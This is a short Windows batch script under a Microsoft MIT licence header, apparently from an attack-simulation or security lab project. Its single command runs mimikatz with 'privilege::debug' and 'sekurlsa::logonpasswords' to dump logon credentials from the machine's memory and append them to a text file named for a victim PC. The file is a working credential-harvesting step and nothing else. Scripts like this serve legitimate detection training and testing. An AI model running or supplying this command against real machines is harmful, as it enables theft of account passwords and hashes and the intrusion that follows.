:: Copyright (c) Microsoft Corporation.  
:: Licensed under the MIT license.

:: harvest creds on location machine; export results to victim-pc.txt
c:\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimpc.txt
pause